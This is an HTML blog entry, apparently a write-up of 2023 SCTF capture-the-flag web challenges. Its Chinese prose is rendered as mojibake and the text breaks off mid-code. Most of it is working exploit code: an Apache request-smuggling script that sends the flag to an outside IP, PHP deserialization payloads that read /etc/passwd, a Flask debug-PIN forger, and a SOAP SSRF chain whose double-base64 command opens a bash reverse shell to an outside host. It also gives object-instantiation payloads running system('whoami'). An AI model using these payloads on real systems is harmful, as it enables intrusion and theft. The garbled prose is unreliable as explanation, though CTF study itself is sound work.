        <content type="html"><![CDATA[<h1 id="2023-SCTF-WEB"><a href="#2023-SCTF-WEB" class="headerlink" title="2023 SCTF WEB"></a>2023 SCTF WEB</h1><p>éš¾â€¦</p><h2 id="ezcheck1n"><a href="#ezcheck1n" class="headerlink" title="ezcheck1n"></a>ezcheck1n</h2><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$FLAG</span> = <span class="string">&quot;flag&#123;fake_flag&#125;&quot;</span>;</span><br><span class="line">@<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;http://&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>].<span class="variable">$FLAG</span>);</span><br><span class="line"><span class="comment"># but it&#x27;s not the real flag</span></span><br><span class="line"><span class="comment"># beacuse someone say this year is not 2023 !!! like the post?</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;./2023.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./post.jpeg&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:image/jpeg;base64,&#x27;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$a</span>) . <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="comment"># notice -&gt; time</span></span><br><span class="line"><span class="comment"># How should you get to where the flag is, the middleware will not forward requests that are not 2023</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç”¨çš„æ˜¯è¿™ä¸ª<a href="https://xz.aliyun.com/t/12345#toc-8">CVE-2023-25690 Apache HTTP Server è¯·æ±‚èµ°ç§æ¼æ´ åˆ†æä¸åˆ©ç”¨ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p>å…¶ä¸­éœ€è¦æ³¨æ„å‡ ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.åªæœ‰ç¬¬ä¸€ä¸ªå“åº”å‘é€ç»™äº†å®¢æˆ·ç«¯</span><br><span class="line">2.ç»“åˆä¸‹æ–¹å›¾ç‰‡ï¼Œèµ°ç§çš„åŒ…åº”è®¿é—®2022.phpè€Œä¸æ˜¯2023</span><br><span class="line">3.2023.phpçš„ä¼ å‚æ–¹å¼ä¸º&amp;url=xxxï¼Œ2022.phpçš„ä¼ å‚æ–¹å¼ä¸º?url=xxx</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pCJgVy9"><img src="https://s1.ax1x.com/2023/06/22/pCJgVy9.png" alt="pCJgVy9.png"></a></p><p>åªæœ‰ç¬¬ä¸€ä¸ªè¯·æ±‚èƒ½è¿”å›å“åº”ï¼Œä½†é¢˜ç›®ä¸­æœ‰<code>@file_get_contents(&quot;http://&quot;.$_GET[&#39;url&#39;].$FLAG);</code>ï¼Œå¯ä»¥å®ç°å¤–å¸¦</p><p>ç”¨æ–‡ç« ä¸­çš„è„šæœ¬æ”¹ä¸€ä¸‹</p><p><strong>pre.txt</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /2022.php?url=81.70.221.206:2333 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>poc.py</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request_prepare</span>():</span><br><span class="line">    hexdata = <span class="built_in">open</span>(<span class="string">&quot;pre.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">    <span class="comment"># print(hexdata)</span></span><br><span class="line">    hexdata = hexdata.replace(<span class="string">b&#x27; &#x27;</span>, <span class="string">b&#x27;%20&#x27;</span>)</span><br><span class="line">    hexdata = hexdata.replace(<span class="string">b&#x27;\r\n&#x27;</span>, <span class="string">b&#x27;%0d%0a&#x27;</span>)</span><br><span class="line">    <span class="comment"># print(hexdata)</span></span><br><span class="line">    uri = <span class="string">b&#x27;/2023/abc%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aPOST%20/2022.php%3Furl%3D81.70.221.206%3A2333&#x27;</span></span><br><span class="line">    req = <span class="string">b&#x27;&#x27;&#x27;GET %b HTTP/1.1\r</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:80\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % uri</span><br><span class="line">    <span class="keyword">return</span> req</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_and_recive</span>(<span class="params">req</span>):</span><br><span class="line">    rec = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    ip = <span class="string">&#x27;115.239.215.75&#x27;</span></span><br><span class="line">    port = <span class="number">8082</span></span><br><span class="line">    p = remote(ip, <span class="built_in">int</span>(port))</span><br><span class="line">    p.send(req)</span><br><span class="line">    rec += p.recv()</span><br><span class="line">    <span class="built_in">print</span>(rec.decode())</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">return</span> rec.decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">req = request_prepare()</span><br><span class="line"><span class="built_in">print</span>(req)</span><br><span class="line"><span class="comment"># print(urllib.parse.unquote(req.decode()))</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;req.txt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(req)</span><br><span class="line">f.close()</span><br><span class="line">res = send_and_recive(req)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;res.txt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(res.encode())</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pCJgxpD"><img src="https://s1.ax1x.com/2023/06/22/pCJgxpD.png" alt="pCJgxpD.png"></a></p><h2 id="pypyp"><a href="#pypyp" class="headerlink" title="pypyp?"></a>pypyp?</h2><p>åªæœ‰ä¸€å¥è¯<code>Session not started</code></p><p>å‘ç°æ˜¯phpå†™çš„</p><p><a href="https://imgse.com/i/pCJ2e1g"><img src="https://s1.ax1x.com/2023/06/22/pCJ2e1g.png" alt="pCJ2e1g.png"></a></p><p>å¯åˆ©ç”¨<code>PHP_SESSION_UPLOAD_PROGRESS</code>å¼ºåˆ¶å¼€å¯session</p><p><a href="https://imgse.com/i/pCJ2Hgg"><img src="https://s1.ax1x.com/2023/06/22/pCJ2Hgg.png" alt="pCJ2Hgg.png"></a></p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Session not started&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$type</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$properties</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$properties</span>)&amp;&amp;<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>)))&#123;</span><br><span class="line">    <span class="variable">$object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>));</span><br><span class="line">    <span class="variable">$object</span> -&gt; <span class="title function_ invoke__">sctf</span>();</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$properties</span>))&#123;</span><br><span class="line">        <span class="variable">$object</span> = <span class="keyword">new</span> <span class="variable">$type</span>(<span class="variable">$properties</span>[<span class="number">0</span>],<span class="variable">$properties</span>[<span class="number">1</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$object</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;http://127.0.0.1:5000/&#x27;</span>.<span class="variable">$properties</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;this is the object: <span class="subst">$object</span> &lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯ç”¨extractè¦†ç›–å˜é‡å»ç”¨åŸç”Ÿç±»åˆ—ç›®å½•è¯»æ–‡ä»¶</p><p>åˆ—ç›®å½•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;type&#x27;</span>=&gt;<span class="string">&#x27;GlobIterator&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;properties&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;/f*&#x27;</span></span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pCJTnjf"><img src="https://s1.ax1x.com/2023/06/22/pCJTnjf.png" alt="pCJTnjf.png"></a></p><p>è¯»æ–‡ä»¶ï¼ˆä¸¤ä¸ªå‚æ•°ï¼Œå¿…é¡»åŠ ä¸Šâ€™râ€™ï¼›ä¸èƒ½éå†ï¼Œä½¿ç”¨ä¼ªåè®®èƒ½ç›´æ¥è¯»å®Œï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;type&#x27;</span>=&gt;<span class="string">&#x27;SplFileObject&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;properties&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;php://filter/convert.base64-encode/resource=/etc/passwd&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;r&#x27;</span></span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>è¯»ä¸äº†flagæ–‡ä»¶ï¼Œæƒé™ä¸å¤Ÿ</p><p><a href="https://imgse.com/i/pCJTMDS"><img src="https://s1.ax1x.com/2023/06/22/pCJTMDS.png" alt="pCJTMDS.png"></a></p><p>çœ‹åˆ°æºç é‡Œè¿˜æœ‰ä¸ªflaskæœåŠ¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$object</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;http://127.0.0.1:5000/&#x27;</span>.<span class="variable">$properties</span>);</span><br></pre></td></tr></table></figure><p>æ¢æµ‹ä¸€ä¸‹å¼€å¯äº†debug</p><p><a href="https://imgse.com/i/pCJTxaQ"><img src="https://s1.ax1x.com/2023/06/22/pCJTxaQ.png" alt="pCJTxaQ.png"></a></p><p>ä¸‹é¢å°±æ˜¯æ„é€ soapå»æ‰“ssrfè¿›debugæ¨¡å¼æ‰§è¡Œå‘½ä»¤</p><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/lib/python3.8/site-packages/flask/app.py&#x27;</span>,  <span class="comment"># æŠ¥é”™å¾—åˆ°</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&quot;02:42:ac:13:00:02&quot;</span>.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>), <span class="number">16</span>)),  <span class="comment"># /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶</span></span><br><span class="line">    <span class="comment"># machine_idç”±ä¸‰ä¸ªåˆå¹¶(dockerå°±åä¸¤ä¸ª)ï¼š1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span></span><br><span class="line">    <span class="string">&quot;349b3354-f67f-4438-b395-4fbc01171fdd&quot;</span> + <span class="string">&quot;96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687&quot;</span></span><br><span class="line">    <span class="comment"># /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line">cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">    num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x: x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash_pin</span>(<span class="params">pin: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(<span class="string">f&quot;<span class="subst">&#123;pin&#125;</span> added salt&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;replace&quot;</span>)).hexdigest()[:<span class="number">12</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®—cookie_value</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_cookie</span>():</span><br><span class="line">    cookie = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(time.time())&#125;</span>|<span class="subst">&#123;hash_pin(rv)&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> cookie</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookie_value = make_cookie()</span><br><span class="line">coo = <span class="string">f&quot;<span class="subst">&#123;cookie_name&#125;</span>=<span class="subst">&#123;cookie_value&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„é€ soap ssrfåºåˆ—åŒ–æ•°æ®</span></span><br><span class="line">soap_str = <span class="string">&#x27;&#x27;&#x27;&lt;?php</span></span><br><span class="line"><span class="string">$target = &#x27;http://127.0.0.1:5000/console?&amp;__debugger__=yes&amp;cmd=__import__(&quot;os&quot;).system(&quot;echo$&#123;IFS&#125;TDJKcGJpOWlZWE5vSUMxcElENG1JQzlrWlhZdmRHTndMemd4TGpjd0xqSXlNUzR5TURZdk1qTXpNeUF3UGlZeA==|base64$&#123;IFS&#125;-d|base64$&#123;IFS&#125;-d|bash&quot;)&amp;frm=0&amp;s=DhOJxtvMXCtezvKtqaK9&#x27;;</span></span><br><span class="line"><span class="string">$headers = array(</span></span><br><span class="line"><span class="string">    &#x27;Cookie: cookie_replace&#x27;</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string">$b = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,&#x27;user_agent&#x27;=&gt;&quot;test\\r\\n&quot;.join(&quot;\\r\\n&quot;,$headers),&#x27;uri&#x27;=&gt; &quot;aaab&quot;));</span></span><br><span class="line"><span class="string">$arr=array(&quot;properties&quot;=&gt;urlencode(serialize($b)));</span></span><br><span class="line"><span class="string">$aaa = serialize($arr);</span></span><br><span class="line"><span class="string">echo $aaa;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">soap_str_replace = soap_str.replace(<span class="string">&#x27;cookie_replace&#x27;</span>, coo)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;soap.php&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file2:</span><br><span class="line">    file2.write(soap_str_replace)</span><br><span class="line"></span><br><span class="line">b = os.popen(<span class="string">&#x27;D:\phpstudy_pro\Extensions\php\php7.3.9nts\php.exe soap.php&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="comment"># æ„å»ºPOSTè¯·æ±‚çš„æ•°æ®</span></span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: file&#125;</span><br><span class="line">    url = <span class="string">&#x27;http://115.239.215.75:8081/index.php&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;PHPSESSID=whoami&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data1 = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;aa&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span>: b</span><br><span class="line">    &#125;</span><br><span class="line">    response1 = requests.post(url=url, headers=headers, data=data1, files=files)</span><br><span class="line">    <span class="comment"># print(response1.text)</span></span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾suidå‘ç°æœ‰curlï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è¯»flagäº†</p><p><a href="https://imgse.com/i/pCtSc1U"><img src="https://s1.ax1x.com/2023/06/23/pCtSc1U.png" alt="pCtSc1U.png"></a></p><h2 id="fumo-backdoor"><a href="#fumo-backdoor" class="headerlink" title="fumo_backdoor"></a>fumo_backdoor</h2><p>é¡ºä¾¿è®°å½•ä¸€ä¸‹<code>new $a($b)</code>çš„åˆ©ç”¨å½¢å¼</p><ul><li>eval(â€œecho new $a($b);â€)</li><li>echo new $a($b)</li><li>new $a($b)</li></ul><h3 id="eval-â€œecho-new-a-b-â€"><a href="#eval-â€œecho-new-a-b-â€" class="headerlink" title="eval(â€œecho new $a($b);â€)"></a>eval(â€œecho new $a($b);â€)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$a</span>(<span class="subst">$b</span>);&quot;</span>);</span><br></pre></td></tr></table></figure><p>$aä¸ºä»»æ„åŸç”Ÿç±»ï¼Œ$bä¸ºè¦æ‰§è¡Œçš„å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=DirectoryIterator&amp;b=system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pCD4y9O"><img src="https://s1.ax1x.com/2023/07/02/pCD4y9O.png" alt="pCD4y9O.png"></a></p><h3 id="echo-new-a-b"><a href="#echo-new-a-b" class="headerlink" title="echo new $a($b)"></a>echo new $a($b)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>åŸºç¡€åŸç”Ÿç±»åˆ©ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=DirectoryIterator&amp;b=glob:/f*</span><br></pre></td></tr></table></figure><h3 id="new-a-b"><a href="#new-a-b" class="headerlink" title="new $a($b)"></a>new $a($b)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.ç¯å¢ƒå‡ºç½‘</span><br><span class="line">2.æ”¯æŒImagickæ‰©å±•å¹¶å¼€å¯</span><br><span class="line">3.ç›®æ ‡åœ°å€ç›®å½•å¯å†™</span><br></pre></td></tr></table></figure><p><a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/</a></p><p>åˆ©ç”¨<strong>Imagick</strong> rce</p><p>å®‰è£…å‚è€ƒï¼š<a href="https://zhuanlan.zhihu.com/p/93401495">PHPå®‰è£…imagickå›¾å½¢æ‰©å±•åº“ - çŸ¥ä¹ (zhihu.com)</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span 